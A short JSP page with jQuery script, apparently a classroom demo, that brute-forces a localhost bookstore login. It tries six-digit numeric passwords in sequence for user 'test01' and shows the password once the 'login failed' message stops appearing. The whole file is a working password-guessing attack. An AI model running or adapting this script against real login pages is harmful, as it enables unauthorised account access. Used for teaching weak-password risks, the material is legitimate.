<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <script src="js/jquery-1.4.2.min.js"></script>
    <script>
        count = 123000;
        $.getCode = function(num){
            str = "" + num;
            for(i=str.length; i<6; i++)
                str = "0" + str;
            return str;
        };

        $.login = function(){
            pass = $.getCode(count);
            $("#code").text(pass);
            $.get("http://localhost:80/bookstore039/login.do?act=in&uname=test01&upass="+pass,function(data,status){
                if(data.indexOf("登录失败")>=0){
                    count++;
                    setTimeout("$.login()", 1);
                }else{
                    alert("密码是："+pass);
                }
            });
        }

        $(function(){
            $("#login").click(function(){
                setTimeout("$.login()", 1000);
            });
        });
    </script>
    <title>Insert title here</title>
</head>
<body>
<input type="button" id="login" value="开始">
当前密码：<span id="code">123000</span>

</body>
</html>